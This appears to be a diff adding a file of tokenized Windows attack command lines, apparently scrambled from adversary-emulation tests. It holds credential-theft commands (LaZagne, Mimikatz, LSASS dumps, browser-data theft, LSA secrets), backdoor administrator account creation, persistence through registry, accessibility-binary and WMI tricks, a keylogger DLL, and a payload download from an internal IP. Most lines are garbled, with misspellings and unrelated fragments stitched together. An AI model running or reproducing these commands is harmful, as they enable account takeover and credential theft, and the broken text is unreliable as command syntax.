@@ -1,0 +1,64 @@
+hack-browser-data-windows-64bit.exe
+namp -sn $ { domain }
+hack-browser-data-windows-64bit.exe
+psr.exe /start /output $ { output_zip }
+query user
+net user administrator /add
+rundll32 popcalc.dll , keylog
+cmdkey /list
+net user /add $ { user_name }
+net user administrator administrator
+vsiisexelauncher.exe -p $ { volumn name ( ( \users\ $ { id -arguments -loadandrundiagscript $ { input_filename_regex
+net user = `` hklm\software\microsoft\windows ; /user localaccount=true
+psr.exe /start /output $ { -classname /d 1
+icacls % \system32\osk.exe : f
+net user = `` $ env : :minidump '' `` keylog
+hostname
+namp -sn $ { filename_regex }
+net user = cor_profiler = servicepackminorversion
+net `` hklm\software\microsoft\windows nt\currentversion\image file `` new-object -comobject ( set * from win32_pnpentity where : net.securityprotocoltype ] : net.securityprotocoltype ] : net.securityprotocoltype ] : hklm : :securityprotocol = [ net.securityprotocoltype convert ] : \windows\system32\spool\tools\printbrm.exe -r \appdata\local\temp\lsass.dmp ' = : [ convert ] ] : :securityprotocol =
+net user $ ( hklm\software\microsoft\windows /domain : f
+net user = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+lazagne.exe windows
+net stop
+copy $ { hkey_local_machine\system\currentcontrolset\control\lsa file '' `` domain
+reg.exe add `` '' `` localaccount=true '' `` $ target ) ;
+copy c : \windows\system32\spool\tools\printbrm.exe -r -f $ shell.createshortcut `` hklm\software\microsoft\active setup\installed components\atomic_test '' execution options\svchost.exe '' -class '__filtertoconsumerbinding file -arguments $ consumerargs = `` $ '' ; /y
+set-itemproperty hkcu : -logname 'image hklm\systyem } file _.lastwritetime '' ' $ { \windows\temp\dumpert.dmp
+net stop
+net user administrator /add bookmarks
+net user `` import \system32\windowspowershell\v1.0\powershell.exe $ : \windows\system32\ username= `` $ shell.createshortcut ( `` domain )
+cmdkey /list
+net user `` @ `` `` % `` \users\ $ { path admins '' $ { remote_host }
+net localgroup administrators `` .\ { user_name } @ `` autorun ''
+net user administrator /add
+net user = `` `` defaultaccount '' dllname
+net user /add $ { domain /user bits_job_name -p $ { user_name }
+silentrunner.exe $ { destination } full
+net localgroup administrators `` '' '' `` cor_profiler '' threadingmodel $ { keylog
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' execution options\mshta.exe '' '' -arguments $ consumerargs
+net localgroup administrators `` administrators '' '' `` $ { filename_regex }
+net user administrator /domain
+reg add `` hklm\system\currentcontrolset\control\session `` = hkey_local_machine\system\currentcontrolset\control\lsa '' `` cor_profiler = `` administrators '' /t reg_dword /d 1 /f
+cmdkey /list
+import-module .\screencap.ps1
+net user administrator /add
+cscript $ { directory_path }
+bitsadmin.exe /create
+invoke-mimikatz.exe
+get-childitem -filter `` put $ { file_name } /sc onlogon . `` `` hklm\software\microsoft\windows /v `` cor_enable_profiling '' /t reg_dword /d 1 /f
+bitsadmin.exe /create $ { target -b @ `` defaultaccount ''
+wscript $ { % copy % \system32\osk.exe
+reg add `` hklm\system\currentcontrolset\control\session manager\environment `` cor_enable_profiling '' `` `` .\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' -name `` threadingmodel '' -value `` threadingmodel -name `` threadingmodel '' '' $ true
+reg.exe add `` hkey_current_user\control panel\desktop '' /v debugger /d : , disabled
+`` [ hklm\security\policy\secrets % \system32\osk.exe
+gobuster dir -l % appdata % \system32\osk.exe : \software\microsoft\command ' set -namespace ' createobject ( `` createobject ( ' ' $ ( new-object lsass ) .id = \system32\osk.exe full
+lazagne.exe windows
+% dir $ : :logonpasswords
+net localgroup administrators `` users '' /t reg_multi_sz
+lazagne.exe windows
+del % \system32\osk.exe
+get-ciminstance -classname -excludeproperty `` ostype , 240 `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+`` http : logon/logoff : -ibck $ /all ' % \system32\osk.exe
+nmap -o `` $ : \windows\system32\
+`` hklm : :dcsync = net.webclient ) -usebasicparsing ) ' ' $ filter \\ $ { copy % path ; full
